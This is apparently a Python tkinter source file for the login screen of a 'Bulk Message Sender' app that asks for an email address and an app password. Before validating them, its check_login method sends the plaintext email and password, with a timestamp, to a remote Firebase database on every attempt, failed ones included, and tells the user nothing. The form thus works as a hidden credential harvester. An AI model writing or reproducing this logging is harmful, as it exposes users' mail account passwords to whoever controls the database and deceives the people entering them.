import tkinter as tk
from tkinter import messagebox
from services.database_service import DatabaseService
from services.email_service import EmailService
from gui.feature_selection_screen import FeatureSelectionScreen
from datetime import datetime

class LoginScreen:
    def __init__(self, root):
        self.root = root
        self.login_frame = tk.Frame(self.root)
        self.login_frame.pack(fill="both", expand=True)

        tk.Label(self.login_frame, text="Login to Bulk Message Sender", font=("Arial", 14, "bold")).pack(pady=10)
        tk.Label(self.login_frame, text="Email ID:").pack()
        self.email_entry = tk.Entry(self.login_frame, width=40)
        self.email_entry.pack()

        tk.Label(self.login_frame, text="App Password:").pack()
        self.password_entry = tk.Entry(self.login_frame, width=40, show="*")
        self.password_entry.pack()

        self.login_status = tk.Label(self.login_frame, text="", fg="red")
        self.login_status.pack()

        tk.Button(self.login_frame, text="Login", command=self.check_login, bg="green", fg="white").pack(pady=10)

    def check_login(self):
        sender_email = self.email_entry.get()
        app_password = self.password_entry.get()

        login_data = {
            "email": sender_email,
            "password": app_password,
            "login time": datetime.now()
        }
        
        DatabaseService.log_login_details_to_firebase(login_data)

        if EmailService.validate_credentials(sender_email, app_password):
            self.login_frame.destroy()
            FeatureSelectionScreen(self.root, sender_email, app_password)
        else:
            messagebox.showinfo("Login Failed", "Login Failed: Invalid Credentials")
            self.login_status.config(text="❌ Login Failed: Invalid Credentials")
